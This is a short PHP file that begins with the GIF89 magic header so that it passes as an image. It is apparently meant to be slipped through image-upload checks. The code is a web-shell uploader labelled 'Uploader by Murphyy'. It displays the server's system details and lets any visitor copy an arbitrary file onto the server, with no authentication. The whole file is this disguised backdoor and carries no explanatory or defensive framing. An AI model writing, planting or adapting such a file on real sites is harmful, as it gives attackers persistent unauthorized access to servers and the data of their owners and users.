GIF89;a
<!DOCTYPE html>
<html>
<head>
	<title></title>
</head>
<body>


<?php
echo '<html> <body bgcolor="red"> <b><center><font face="Arial"><form action="" method="POST" enctype="multipart/form-data" name="uploader" id="uploader"><title>Uploader by Murphyy</title><p>Uploader by murphyy<br>';

echo "<b>".php_uname()."</b>";
echo "<br><br>";
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
    if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
    echo '<b>Yukleme Basarili</b><br><br>';
    }
}

echo '</center></body> </font></b></html>'

?>

</body>
</html>